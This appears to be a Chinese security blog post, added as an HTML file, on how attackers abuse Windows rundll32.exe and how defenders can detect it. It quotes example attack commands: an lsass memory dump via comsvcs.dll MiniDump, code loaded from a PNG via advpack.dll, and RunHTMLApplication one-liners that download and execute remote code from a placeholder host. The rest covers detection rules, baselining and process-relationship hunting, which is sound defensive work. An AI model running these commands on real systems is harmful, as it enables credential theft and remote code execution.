@@ -1,0 +1,850 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="慕长风">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="要做好检测能力，必须得熟悉你的系统环境，只有足够了解正常行为，才能真正找出异常(Anomaly)和威胁(Threat)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="揭秘rundll32中的攻防对抗">
+<meta property="og:url" content="https://muchangfeng.com/2021/12/29/%E6%8F%AD%E7%A7%98rundll32%E4%B8%AD%E7%9A%84%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/index.html">
+<meta property="og:site_name" content="慕长风的小酒馆">
+<meta property="og:description" content="要做好检测能力，必须得熟悉你的系统环境，只有足够了解正常行为，才能真正找出异常(Anomaly)和威胁(Threat)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://photo.moofeng.cn/typora/image-20220216161146153.png">
+<meta property="article:published_time" content="2021-12-29T06:30:56.000Z">
+<meta property="article:modified_time" content="2022-02-16T08:11:51.750Z">
+<meta property="article:author" content="慕长风">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://photo.moofeng.cn/typora/image-20220216161146153.png">
+  
+  
+  <title>揭秘rundll32中的攻防对抗 - 慕长风的小酒馆</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"muchangfeng.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"pDqTgkge6AYMMtLKaVJCILFv-gzGzoHsz","app_key":"b4RgBYwktF5lnglCRU472Azq","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>慕长风的小酒馆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          <span id="subtitle" title="揭秘rundll32中的攻防对抗">
+            
+          </span>
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-29 14:30" pubdate>
+          2021年12月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">揭秘rundll32中的攻防对抗</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>要做好检测能力，必须得熟悉你的系统环境，只有足够了解正常行为，才能真正找出异常(Anomaly)和威胁(Threat)</p>
+<p>在<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262742">上篇文章</a>中介绍 CS 的一些行为特征时，经常提及 rundll32.exe，哪怕非安全人员，可能对该进程都不陌生</p>
+<p>顾名思义，rundll32.exe 可用于执行 DLL 文件，也能调用该文件中的内部函数</p>
+<p>它的历史差不多能追溯到 Windows 95，几乎是所有 Windows 操作系统的必需组件，不能轻易地被禁用</p>
+<p>攻击者可以借助 rundll32.exe 加载 DLL 文件中的恶意代码，避免像其它 EXE 文件一样直接在进程树中现行</p>
+<p>另外，攻击者还可能滥用合法 DLL 文件中的导出函数，比如待会儿就会介绍到的 comsvcs.dll 和 MiniDump</p>
+<p>除了加载 DLL 文件，rundll32.exe 还能通过 RunHtmlApplication 函数执行 JavaScript</p>
+<p>正因为这些特性，rundll32.exe 很容易博得攻击者的青睐，在攻击技术流行度中常常名列前茅</p>
+<img src="http://photo.moofeng.cn/typora/image-20211208115813167.png" srcset="/img/loading.gif" lazyload alt="image-20211208115813167" style="zoom:50%;" />
+
+
+
+<h3 id="常用场景"><a href="#常用场景" class="headerlink" title="常用场景"></a>常用场景</h3><p>对于 rundll32.exe，最简单粗暴的用法当然是直接指定文件名称，执行目标 DLL：</p>
+<ul>
+<li><code>rundll32.exe &lt;dllname&gt;</code></li>
+</ul>
+<p>当然，在我们日常使用操作系统的过程中，见得最多的可能是通过 rundll32.exe 调用某些 DLL 文件中的特定函数这一行为：</p>
+<ul>
+<li><code>rundll32.exe &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</code></li>
+</ul>
+<p>譬如，在我们右键点击某文档，选择特定的“打开方式”，然后会弹出个窗口供我们指定用于打开的应用程序，实际上就相当于在后台执行了以下命令：</p>
+<ul>
+<li><code>C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL &lt;file_path&gt;</code></li>
+</ul>
+<p>拿修改 hosts 文件举个例子，通过 WIN+R 执行以下命令，即可弹出该选择窗口：</p>
+<ul>
+<li><code>C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL C:\Windows\System32\drivers\etc\hosts</code></li>
+</ul>
+<p><img src="http://photo.moofeng.cn/typora/image-20211214212946699.png" srcset="/img/loading.gif" lazyload alt="image-20211214212946699"></p>
+<p>类似行为在我们的日志中呈现出来通常会是这么个模样：</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211214213939297.png" srcset="/img/loading.gif" lazyload alt="image-20211214213939297"></p>
+<p>关于 shell32.dll，比较常见的函数还有 <code>Control_RunDLL</code> 和 <code>Control_RunDLLAsUser</code>，它们可以用于运行 .CPL 文件，一般主要是控制面板中的小程序</p>
+<p>例如打开防火墙： <code>C:\WINDOWS\System32\rundll32.exe C:\WINDOWS\System32\shell32.dll,Control_RunDLL C:\WINDOWS\System32\firewall.cpl</code></p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211214213302558.png" srcset="/img/loading.gif" lazyload alt="image-20211214213302558"></p>
+<p>很显然，这里的 CPL 文件也可以被替换成恶意文件，所以一旦出现可疑的路径及文件名，我们就需要结合其它工具来检查它的合法性</p>
+<p>关于这一攻击手法的使用细节，这篇 <a target="_blank" rel="noopener" href="https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf">Paper</a> 值得一读，本文就不展开阐述了</p>
+<p>另外附上一张<a target="_blank" rel="noopener" href="https://www.tenforums.com/tutorials/77458-rundll32-commands-list-windows-10-a.html">表格</a>链接，其中包含了 Windows 10 上 rundll32.exe 可快速调用的命令清单及其功能含义</p>
+<p>毕竟人生苦短，大家都没时间去记住那么多命令，但是不妨先 mark 一下，等到有需要时可以迅速查出其含义</p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>借助 rundll32.exe 实现的攻击方式非常多，这里我只简单介绍几种比较有特色的利用姿势</p>
+<h4 id="合法的DLL调用"><a href="#合法的DLL调用" class="headerlink" title="合法的DLL调用"></a>合法的DLL调用</h4><p>攻击者如果使用合法的 DLL 文件来完成攻击活动，按照传统的检测手段，确实会大大增加防守难度</p>
+<p>例如利用 comsvcs.dll 中的 MiniDump 函数对目标进程进行内存转储，从而实现凭证窃取，参考<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs.dll">这里</a>：</p>
+<ul>
+<li><code>C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; C:\temp\lsass.dmp full</code></li>
+</ul>
+<p><img src="http://photo.moofeng.cn/typora/comsvcsdll.png" srcset="/img/loading.gif" lazyload alt="comsvcsdll"></p>
+<p>类似的还有 advpack.dll，原本是用于帮助硬件和软件读取和验证.INF文件，也会被攻击者用做代码执行</p>
+<p>印象比较深刻的是之前分析一些木马病毒时见过类似的使用技巧，特意搜了下，这里好像也有相关<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97329/">文章</a>：</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211212122220294.png" srcset="/img/loading.gif" lazyload alt="image-20211212122220294"></p>
+<p>该病毒在图片中存放恶意代码，通过白利用完成代码执行，不熟悉的小伙伴遇见了真的很容易被瞒过去：</p>
+<ul>
+<li><code>c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection c:\microsoft\360666.png,DefaultInstall</code></li>
+</ul>
+<p>当然，这些攻击手法在实际使用过程中肯定会有许多变种，用于绕过一些常规的检测方式，比如 MiniDump 函数的调用也可以通过编号 #24 完成</p>
+<p>感兴趣的朋友可以看看<a target="_blank" rel="noopener" href="http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/">这里</a>：</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211210165706725.png" srcset="/img/loading.gif" lazyload alt="image-20211210165706725"></p>
+<h4 id="远程代码加载"><a href="#远程代码加载" class="headerlink" title="远程代码加载"></a>远程代码加载</h4><p>除了本地加载之外，rundll32.exe 也可以通过 RunHtmlApplication 函数执行 JavaScript 以实现远程代码加载，例如：</p>
+<ul>
+<li><p><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip:port/&#39;);&quot;</code></p>
+</li>
+<li><p><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/XXX/XXX&quot;)</code></p>
+</li>
+</ul>
+<p><img src="https://pbs.twimg.com/media/BtNtpPRCAAAHmAy?format=png&name=900x900" srcset="/img/loading.gif" lazyload alt="图像"></p>
+<p>值得一提的是，根据笔者的观察，目前还没怎么看到日常活动中关于 javasciprt 关键字的合理使用场景，所以通常我会直接将该特征加入检测规则清单</p>
+<p>关于该攻击手法，更多内容可以看看这篇<a target="_blank" rel="noopener" href="https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/">文章</a></p>
+<h4 id="滥用COM组件"><a href="#滥用COM组件" class="headerlink" title="滥用COM组件"></a>滥用COM组件</h4><p>关于 rundll32.exe 还有一些比较少见的命令行参数 ———— <code>-sta</code> 和 <code>-localserver</code>，它们俩都能用来加载恶意注册的 COM 组件</p>
+<p>登上自家的 SIEM 去看看，说不定也能够发现以下活动(至少我确实根据相关数据狩猎到了一些有意思的活动:P)</p>
+<ul>
+<li><code>rundll32.exe –localserver &lt;CLSID_GUID&gt;</code></li>
+<li><code>rundll32.exe –sta &lt;CLSID_GUID&gt;</code></li>
+</ul>
+<p>对 COM 组件不熟悉的童鞋可能需要先得去补补课，比如 ATT&amp;CK 在持久化阶段中提及到的 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1546/015/">T1546.015-Component Object Model Hijacking</a></p>
+<p>简单来讲，当我们看到类似的命令行参数时，最好先去看看对应注册表下的键值对是否包含恶意的 DLL 文件或 SCT 脚本</p>
+<p>它们通常在这个位置：<code>\HKEY_CLASSES_ROOT\CLSID\&lt;GUID&gt;</code>，可结合下图食用</p>
+<p><img src="http://photo.moofeng.cn/typora/rundll32_sta.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>关于具体的利用原理和攻击细节可以看看<a target="_blank" rel="noopener" href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/">这里</a>，还有这篇<a target="_blank" rel="noopener" href="https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/">文章</a>中提到的使用 <code>-localserver</code> 作为攻击变种的使用姿势</p>
+<h3 id="检测技巧"><a href="#检测技巧" class="headerlink" title="检测技巧"></a>检测技巧</h3><h4 id="命令行检测"><a href="#命令行检测" class="headerlink" title="命令行检测"></a>命令行检测</h4><p>首先让我们一起回顾一遍 rundll32.exe 的基本使用方法：</p>
+<ul>
+<li><code>rundll32.exe &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</code></li>
+</ul>
+<p>从 rundll32 的文件位置开始，我们可以设定一条最基础的检测规则，因为它通常只有以下两种选择：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">C:\Windows\System32\rundll32.exe</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">C:\Windows\SysWOW64\rundll32.exe</span> <span class="hljs-string">(32bit</span> <span class="hljs-string">version</span> <span class="hljs-string">on</span> <span class="hljs-string">64bit</span> <span class="hljs-string">systems)</span><br></code></pre></td></tr></table></figure>
+
+<p>虽然简单，但也不并一定完全无用武之地：</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211212155002278.png" srcset="/img/loading.gif" lazyload alt="image-20211212155002278"></p>
+<p>接着，让我们开始关注 DLL 文件和导出函数</p>
+<p>通过前文的介绍，我们应该能达成共识：在日常活动中，rundll32.exe 的出场次数并不少见</p>
+<p>对于这种可能存在较多干扰信息的情况，我习惯使用漏斗模型来帮助缩小检测范围，简单来讲就是尽你所能(不一定非得用UEBA)去建设行为基线，然后剔除正常活动，重点关注偏离动作</p>
+<p>例如，我简单统计了下自己电脑上出现过的 DLl 文件和导出函数，我们可以</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211215011759719.png" srcset="/img/loading.gif" lazyload alt="image-20211215011759719"></p>
+<p>在生产环境中，对于行为基线之外的活动，仍然可能包含大量业务相关的正常行为，这时还可以加上长尾分析法，关注特定阈值之下的少数可疑行为</p>
+<p>或者我们还可以检查下有哪些不规范的文件或者函数名，比如这里我只简单设置条件为未包含关键字 “.dll”</p>
+<p>对于之前提过 CobaltStrike 在后渗透阶段调用 rundll32.exe 的方式，就可以很轻松地通过这一技巧检测出来</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211215012621539.png" srcset="/img/loading.gif" lazyload alt="image-20211215012621539"></p>
+<p>另外，其实我印象比较深刻的是以前使用该技巧发现过这么一起异常行为：<code>rundll32.exe uwcidcx.vb,capgj</code></p>
+<p>当时只是觉得可疑，还不敢直接定性，直到写这篇文章时，在 Red Canary 的报告中发现了类似的攻击活动，且有着相同的上下文特征，才得以确认为某后门病毒</p>
+<p>当然，这种方法可能会存在漏报，所以需要结合后文中的其它检测点搭配食用</p>
+<h4 id="敏感函数监测"><a href="#敏感函数监测" class="headerlink" title="敏感函数监测"></a>敏感函数监测</h4><p>前面介绍过一些使用合法的 DLL 文件及其函数完成的攻击活动，这种特定的白利用行为就需要我们重点关注了</p>
+<p>例如 MiniDump 与其对应的函数编号 #24，其它更多的 tips 可能需要请红队成员帮帮忙，毕竟术业有专攻嘛</p>
+<p>还有 javascript 的用法，因为它在日常行为中非常罕见，所以也可以享受下特殊待遇，加入观察名单</p>
+<p>当然，有些特殊行为我们无法一眼定性，这时往往需要安全人员进行人工判定</p>
+<p>对于这种场景，我们可以针对这些敏感的函数调用行为建设相应的 dashboard</p>
+<p>例如上文提到的 <code>-sta</code> 关键字的用法，我们可能不方便根据 GUID 完成自动化研判，但是可以通过这种方式提高狩猎效率</p>
+<h4 id="通信行为监测"><a href="#通信行为监测" class="headerlink" title="通信行为监测"></a>通信行为监测</h4><p>根据我的观察经验，rundll32 在网络通信行为上的花样并不多，这对于我们建立异常检测模型是非常有利的</p>
+<p>我在自己的主机上统计了下，只有实验中 beacon 通信时留下了 rundll32 的网络通信日志</p>
+<p>当然，实验环境的数据没有说服力，而且我自己也维护了一份白名单，这里只是演示下统计方式，大家可以在自己的环境中去试一试</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211214232400479.png" srcset="/img/loading.gif" lazyload alt="image-20211214232400479"></p>
+<p>如果有 EDR 在进程通信时能采集到相应的命令行日志，我们还可以结合进程和网络行为一起分析</p>
+<p>而通常情况下我们的日志中可能会缺少这些字段(例如sysmon)，没关系，这时我们就一切从简</p>
+<p>比如直接结合威胁情报食用，调用 API 查询 rundll32.exe 的目的地址是否可疑</p>
+<p>另外，如果 rundll32.exe 存在扫描行为或者访问特殊端口(例如445、数据库端口等)，这种情况应该不用多讲了吧(PS：我还真遇过好几次)</p>
+<p>要是还想玩点高级的，可以结合通信频率，学习下检测 beacon 的姿势，比如根据 jitter 特征检测 C2 通信，参考这篇<a target="_blank" rel="noopener" href="https://posts.bluraven.io/enterprise-scale-threat-hunting-network-beacon-detection-with-unsupervised-ml-and-kql-part-2-bff46cfc1e7e">文章</a></p>
+<h4 id="异常关系检测"><a href="#异常关系检测" class="headerlink" title="异常关系检测"></a>异常关系检测</h4><p>这部分可能涉及到的攻击手法就比较多样了，比如钓鱼邮件、webshell、计划任务或WMI等持久化中都有可能用到 rundll32.exe</p>
+<p>所以需要对相关进程间的父子关系列一份检测清单，例如以下进程就应该划上重点：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>winword.exe<br><span class="hljs-bullet">- </span>excel.exe<br><span class="hljs-bullet">- </span>taskeng.exe<br><span class="hljs-bullet">- </span>winlogon.exe<br><span class="hljs-bullet">- </span>schtask.exe<br><span class="hljs-bullet">- </span>regsvr32.exe<br><span class="hljs-bullet">- </span>wmiprvse.exe<br><span class="hljs-bullet">- </span>wsmprovhost.exe<br>...<br></code></pre></td></tr></table></figure>
+
+<p>而对于清单内的进程，我们还可以借助图数据来构建 dashboard，如果有个专门的模块能够记录这些罕见的进程链，监测时便是一目了然</p>
+<p><img src="http://photo.moofeng.cn/typora/image-20211215013919700.png" srcset="/img/loading.gif" lazyload alt="image-20211215013919700"></p>
+<p>当然，有机会的话，也别漏掉了一些特殊的访问关系，比如 rundll32.exe 对 lsass.exe 发起高权限的进程间访问</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>最后，这篇文章中贴的相关链接比较多，大部分都需要翻出去才能访问，所以如果遇到无法访问的情况其实是正常现象</p>
+<p>有些地方的贴图不方便展示真实数据，只能贴网图或者在实验环境下截图，显示的数据样本会比较小，但是文中的结论实际上有大量样本支撑，基本可以放心食用</p>
+<p>如有纰漏之处，或者其他有意思的发现，欢迎私信交流~~</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/" class="category-chain-item">安全攻防</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>揭秘rundll32中的攻防对抗</div>
+      <div>https://muchangfeng.com/2021/12/29/%E6%8F%AD%E7%A7%98rundll32%E4%B8%AD%E7%9A%84%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>慕长风</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月29日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/18/%E8%B5%B0%E8%BF%9BWindows%E4%B8%AD%E7%9A%84%E6%8F%90%E6%9D%83%E8%A1%8C%E4%B8%BA/" title="走进Windows中的提权行为">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">走进Windows中的提权行为</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/14/%E5%9F%BA%E4%BA%8E%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8BCobaltStrike/" title="基于异常行为检测CobaltStrike">
+                        <span class="hidden-mobile">基于异常行为检测CobaltStrike</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.staticfile.org/valine/1.4.16/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"pDqTgkge6AYMMtLKaVJCILFv-gzGzoHsz","appKey":"b4RgBYwktF5lnglCRU472Azq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail"],"requiredFields":["nick"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      记录和分享我的网安成长历程。
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
